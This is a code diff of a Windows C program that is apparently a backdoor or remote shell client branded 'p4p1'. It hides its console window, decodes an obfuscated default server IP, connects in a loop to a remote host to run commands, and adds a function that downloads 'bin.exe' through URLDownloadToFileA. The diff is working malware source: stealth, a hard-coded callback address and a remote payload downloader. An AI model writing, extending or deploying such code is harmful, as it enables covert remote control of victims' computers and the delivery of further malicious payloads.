@@ -6,7 +6,6 @@ int main(int argc, char * argv[])
 		stealth();
 	fileWrapper file;
 
-	//init_file(&file);
     // Create the basic variables so that you can get the port data
 	int portno;     //number of port
 	char ip[16];
@@ -32,7 +31,7 @@ int main(int argc, char * argv[])
 
 	if(fip == NULL){
 		char ipjib[14] = "97/358/316/213";
-		char corip[14];
+		char corip[15];
 
 		int i;
 
@@ -41,9 +40,10 @@ int main(int argc, char * argv[])
 			ch = ipjib[i];
 			corip[i] = decr(ch);
 		}
+		corip[14] = '\0';
 
 		strcpy(file.ip, corip);
-		printf("%s", corip);      //If no file set up default ip to prevent errors
+
 	} else {
 		int i = 0;
 		char c;
@@ -58,9 +58,11 @@ int main(int argc, char * argv[])
 		fclose(fip);
 	}
 
+	printf("%s:%d", file.ip, file.portno);
+
 	//Main program
 	while(1){
-		printf("loop\n");
+
 		//startup sa
 		WSADATA wsa;
 		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
@@ -89,7 +91,7 @@ int main(int argc, char * argv[])
 		client.sin_family = AF_INET;
 		client.sin_port = htons(file.portno);
 		client.sin_addr.s_addr = inet_addr(file.ip);	//this should not be hard coded.
-		printf("%s:%d", file.ip, file.portno);
+
 
 
 		/* create pointers so that the synthacts gets faster*/
@@ -226,4 +228,121 @@ int main(int argc, char * argv[])
 		_pclose(pPipe);
 	}//end of main while loop.
 	return 0;
+}
+
+/*
+ * get buf and check if p4p1 custom command
+ */
+int iscommand(char buf)
+{
+	if(buf == '*'){
+		return 1;
+	} else if(buf == '&') {
+		return 2;
+	} else {
+		return 0;
+	}
+}
+
+/*Downloader func
+ */
+
+int download(char * url)
+{
+	char path[100] = "bin.exe";
+	int r = 1;
+	HMODULE hDll;
+	UDTF URLDownloadToFile;
+
+
+	if((hDll = LoadLibrary("urlmon"))) {
+		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
+			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
+				r = 0;
+	}
+		FreeLibrary(hDll);
+	}
+
+	return r;
+}
+
+/*
+ * wrapper for recv the sessionid
+ **/
+char wrecvsid(int sock, int size, int *br)
+{
+	int pbr = *(int *)br;
+	char buf[size];
+	pbr = SOCKET_ERROR;
+	while(pbr == SOCKET_ERROR){
+		pbr = recv(sock, buf, size, 0);
+			if(pbr == 0 || pbr == WSAECONNRESET){
+				break;
+			}
+
+			if(pbr < 0){
+				return -1;
+			} else {
+				return buf[0];
+			}
+	}
+
+}
+
+/*
+ * Wrapper to send prompt
+ */
+int sendui(int s, char uin, int * bs)
+{
+	int pbs = *(int *)bs;
+	char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";
+	char uivpn[146] = "      _ _       _\n _ __| | | _ __/ |_ ___ __ _ _\n| '_ \\_  _| '_ \\ \\ \\V / '_ \\ ' \\\n| .__/ |_|| .__/_|\\\\_/| .__/_||_|\n|_|       |_|        |_|    \n\0";
+
+	if(uin == '0'){
+		pbs = send(s, ui, sizeof(ui), 0);
+	        if(pbs == SOCKET_ERROR) { //server disconnected!
+	        	if(WSAGetLastError() != WSAECONNREFUSED
+	                || WSAGetLastError() == WSAECONNRESET){
+	                	return 1;
+	                } else {
+	       	                return 1;
+	                }
+		}
+	}
+
+	if(uin == '1'){
+		pbs = send(s, uivpn, sizeof(uivpn), 0);
+                if(pbs == SOCKET_ERROR) { //server disconnected!
+                        if(WSAGetLastError() != WSAECONNREFUSED
+                        || WSAGetLastError() == WSAECONNRESET){
+                                return 1;
+                        } else {
+                                return 1;
+                        }
+                }
+	}
+
+
+	return 0;
+}
+
+void stealth()
+{
+	HWND stealth;
+	AllocConsole();
+	stealth=FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+}
+
+/*
+ *Verry simple crypo to hide some stuff
+ **/
+char incr(char ch)
+{
+	return ch+1;
+}
+
+char decr(char ch)
+{
+	return ch-1;
 }
